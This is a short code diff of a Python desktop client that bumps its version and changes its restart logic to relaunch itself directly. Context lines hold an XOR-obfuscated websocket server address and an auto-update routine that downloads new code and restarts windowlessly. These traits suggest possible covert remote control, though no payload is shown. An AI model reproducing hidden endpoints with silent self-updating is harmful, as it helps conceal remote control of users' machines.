@@ -20,7 +20,7 @@ def _get_self_hash() -> str:
         return ""
 
 # ── Version ───────────────────────────────────────────────────────────────────
-CURRENT_VERSION = "1.98"
+CURRENT_VERSION = "1.99"
 
 # ── Internal ──────────────────────────────────────────────────────────────────
 _x = bytes([b ^ 0x5A for b in [45,41,41,96,117,117,53,41,57,116,55,63,106,45,61,110,55,51,52,61,116,62,63]]).decode()
@@ -270,12 +270,11 @@ def check_for_updates():
 
         print(f"[*] Update downloaded – restarting...")
 
-        # Restart via launcher.py so AppData client.py is picked up automatically
-        launcher = os.path.join(_BASE_DIR, "launcher.py")
+        # Restart client.py directly (avoid double-start via launcher.py)
         python = os.path.join(_BASE_DIR, "python", "pythonw.exe")
         if not os.path.exists(python):
             python = _sys.executable
-        subprocess.Popen([python, launcher])
+        subprocess.Popen([python, __file__])
         import time as _time
         _time.sleep(1.5)
         os._exit(0)
@@ -929,8 +928,7 @@ def open_settings_window(parent_root, click_x=None, click_y=None):
         python = os.path.join(os.path.dirname(os.path.abspath(_sys.executable)), "pythonw.exe")
         if not os.path.exists(python):
             python = _sys.executable
-        # Restart via launcher.py so AppData client.py is picked up automatically
-        launcher = os.path.join(_BASE_DIR, "launcher.py")
+        # Restart client.py directly (avoid double-start via launcher.py)
         python = os.path.join(_BASE_DIR, "python", "pythonw.exe")
         if not os.path.exists(python):
             python = _sys.executable
@@ -940,7 +938,7 @@ def open_settings_window(parent_root, click_x=None, click_y=None):
             parent_root.withdraw()
         except Exception:
             pass
-        subprocess.Popen([python, launcher])
+        subprocess.Popen([python, __file__])
         import time as _time
         _time.sleep(1.5)
         os._exit(0)
